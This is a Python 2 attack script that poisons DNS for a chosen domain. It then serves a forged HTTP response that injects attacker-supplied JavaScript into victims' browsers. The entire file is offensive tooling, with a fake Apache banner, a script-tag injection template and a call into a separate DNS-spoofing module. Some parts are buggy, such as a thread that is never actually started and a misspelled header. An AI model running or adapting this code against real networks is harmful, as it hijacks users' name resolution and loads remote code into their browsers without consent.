#!/usr/bin/python

#the most unusual and ignorant pseudo web server written ever

import socket
import sys
import threading


class Inject(object):

	def __init__(self, host, port, js, url):
                if url != None:
                	self.url = url
                else:
                        try: self.url = raw_input("[+] Enter the domain to inject the script: ")
                        except KeyboardInterrupt: pass
                if js != None:
                        self.js = js
                else:
                        try: self.js = raw_input("[+] Enter the script source: ")
                        except KeyboardInterrupt: pass

		self.response = """ HTTP/1.1 200 OK
Date: Thu, 12 Apr 2016 15:25 GMT
Server: Apache/2.2.17 (Unix) mod ssl/2.2 17 OpenSSL/0.9.8l DAV/2
Last-Modified: Sat, 28 Aug 2015 22:17:02 GMT
ETag: "20e2b8b-3c-48ee99731f380"
Accept-Ranges: bytes
Content-Lenght: 49
Connection: close
Content-Type: text/html


<head>
<script src= {}></script>
</head>
""".format(self.js)
#<body>
#<meta http-equiv="refresh" content="0; URL='http://{}"/>
#</body>
		self.host = host
		self.port = port

	def start(self):
		print "[+] Script Injection initialized on domain: {}".format(self.url)
		self.t = threading.Thread(name='Injection', target=self.server)
		self.t.setDaemon(True)
		self.t.start

	def stop(self):
		try:
			self.t.stop()
			print "[-] Script Injection finalized."
		except Exception as e:
			print "[!] Exception caught: {}".format(e)

	def server(self):
		from dnspoisoner import DNSspoof
                self.dnsspoof = DNSspoof(self.url, self.host)
                self.dnsspoof.start()

		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server_address = (self.host, self.port)
		print '[+] Injection URL - http://{}:{}'.format(self.host,self.port)
		server.bind(server_address)
		server.listen(1)
		for i in range (0,3):
			if i >= 2:
				print "[+] Script Injected on: ", client_address
				self.dnsspoof.stop()
			try:
				connection,client_address = server.accept()
				connection.send("%s" % self.response)
				connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
				connection.close()
			except KeyboardInterrupt:
				server.close()

